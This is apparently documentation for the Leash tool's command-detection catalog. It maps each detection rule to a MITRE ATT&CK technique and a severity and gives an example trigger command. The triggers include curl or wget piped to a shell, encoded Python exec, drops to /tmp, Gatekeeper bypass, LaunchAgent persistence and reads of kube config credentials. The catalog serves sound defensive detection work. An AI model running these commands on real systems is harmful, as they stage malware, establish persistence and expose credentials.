# Leash Detection Catalog

The table below documents command-pattern detections emitted by `detect_dangerous_commands` in `src/collector.rs`.

| Detection name | MITRE ATT&CK ID | Description | Severity | Public source citation | Example trigger command |
|---|---|---|---|---|---|
| `download_pipe_shell` | T1105 | Detects direct download-and-execute pipelines (for example `curl ... \| bash`). | Orange | MITRE ATT&CK T1105 (Ingress Tool Transfer): https://attack.mitre.org/techniques/T1105/ | `curl https://example.com/install.sh | bash` |
| `wget_pipe_shell` | T1105 | Detects `wget` output piped directly to a shell interpreter. | Orange | MITRE ATT&CK T1105 (Ingress Tool Transfer): https://attack.mitre.org/techniques/T1105/ | `wget -O - https://example.com/payload.sh | sh` |
| `base64_decode` | T1027 | Detects base64 decoding commonly used to obfuscate payloads. | Orange | MITRE ATT&CK T1027 (Obfuscated/Compressed Files and Information): https://attack.mitre.org/techniques/T1027/ | `echo ZWNobyBoaQ== | base64 -d` |
| `encoded_python` | T1027 | Detects inline Python execution that includes base64 content. | Red | MITRE ATT&CK T1027 (Obfuscated/Compressed Files and Information): https://attack.mitre.org/techniques/T1027/ | `python3 -c "import base64;exec(base64.b64decode('cHJpbnQoMSk='))"` |
| `eval_execution` | T1059.004 | Detects explicit use of `eval` for dynamic shell execution. | Orange | MITRE ATT&CK T1059.004 (Unix Shell): https://attack.mitre.org/techniques/T1059/004/ | `eval "$(cat /tmp/stage.sh)"` |
| `ssh_unusual_host` | T1021.004 | Detects SSH usage to non-standard/suspicious destination forms. | Orange | MITRE ATT&CK T1021.004 (SSH): https://attack.mitre.org/techniques/T1021/004/ | `ssh root@198.51.100.42` |
| `netcat_listener` | T1048 | Detects netcat in listen mode, often used for ad-hoc C2 or exfil channels. | Orange | MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol): https://attack.mitre.org/techniques/T1048/ | `nc -l -p 4444` |
| `download_exec` | T1222.001 | Detects `chmod +x` combined with download or temp-path execution context. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `chmod +x /tmp/payload` |
| `download_exec_tmpdir` | T1222.001 | Detects explicit download-then-execute flow targeting `/tmp` or `/dev/shm`. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `curl -o /tmp/dropper http://example.com/d && chmod +x /tmp/dropper` |
| `exec_tmpdir` | T1059.004 | Detects executable invocation directly from `/tmp` or `/dev/shm`. | Orange | MITRE ATT&CK T1059.004 (Unix Shell): https://attack.mitre.org/techniques/T1059/004/ | `/dev/shm/runner` |
| `gatekeeper_bypass` | T1553.001 | Detects macOS quarantine removal and Gatekeeper bypass commands (`xattr`). | Orange | MITRE ATT&CK T1553.001 (Gatekeeper Bypass): https://attack.mitre.org/techniques/T1553/001/ | `xattr -d com.apple.quarantine /tmp/payload` |
| `osascript_tmp_exec` | T1059.002 | Detects `osascript` execution from temporary directories. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `osascript /tmp/stage.scpt` |
| `osascript_inline_sensitive` | T1059.002 | Detects inline AppleScript commands with sensitive automation keywords. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `osascript -e 'tell application "System Events" to keystroke "password"'` |
| `osacompile_with_curl` | T1059.002 | Detects AppleScript compilation combined with network retrieval. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `curl -fsSL https://x/y | osacompile -o /tmp/x.scpt` |
| `fileless_pipeline_decode` | T1059.004 | Detects multi-stage fileless pipeline with `curl`, `base64 -d`, and `gunzip`. | Orange | Unit 42, “CURL to Shell” tradecraft observations: https://unit42.paloaltonetworks.com/ | `curl -fsSL http://example.com/a | base64 -d | gunzip` |
| `fileless_pipeline_python` | T1059.004 | Detects direct network pipeline to Python interpreter. | Orange | Red Canary ATT&CK mappings for scripting abuse: https://redcanary.com/threat-detection-report/techniques/ | `curl -fsSL http://example.com/a | python3` |
| `curl_raw_ip` | T1071.001 | Detects `curl` downloads from raw non-RFC1918 IPv4 addresses. | Orange | MITRE ATT&CK T1071.001 (Web Protocols): https://attack.mitre.org/techniques/T1071/001/ | `curl -O http://8.8.8.8/payload` |
| `wget_raw_ip` | T1071.001 | Detects `wget` downloads from raw non-RFC1918 IPv4 addresses. | Orange | MITRE ATT&CK T1071.001 (Web Protocols): https://attack.mitre.org/techniques/T1071/001/ | `wget http://1.2.3.4/tool` |
| `launchd_persistence` | T1543.001 | Detects writes to LaunchDaemons or LaunchAgents for macOS persistence. | Orange | MITRE ATT&CK T1543.001 (Create or Modify System Process: Launch Agent): https://attack.mitre.org/techniques/T1543/001/ | `echo plist > ~/Library/LaunchAgents/com.bad.plist` |
| `kube_config_access` | T1552.001 | Detects reads of Kubernetes client config that may contain credentials. | Orange | MITRE ATT&CK T1552.001 (Credentials In Files): https://attack.mitre.org/techniques/T1552/001/ | `cat ~/.kube/config` |
| `touch_mkdir_sensitive` | T1005 | Detects directory creation or touch activity in sensitive filesystem paths. | Orange | MITRE ATT&CK T1005 (Data from Local System): https://attack.mitre.org/techniques/T1005/ | `mkdir /etc/cron.hourly/.cache` |
| `write_sensitive_path` | T1222.001 | Detects writes/copies/moves into sensitive paths under `/etc`, `/usr`, `/var`, `/boot`, or `/Library`. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `cp payload /etc/cron.d/system-update` |

## Severity model

Leash assigns detection event severity in `ProcessCollector::analyze`:
- `Red`: any detection hit containing `write_sensitive_path`, `download_exec`, or `encoded_python`
- `Orange`: all other command-pattern detections

Reference: `src/collector.rs`.
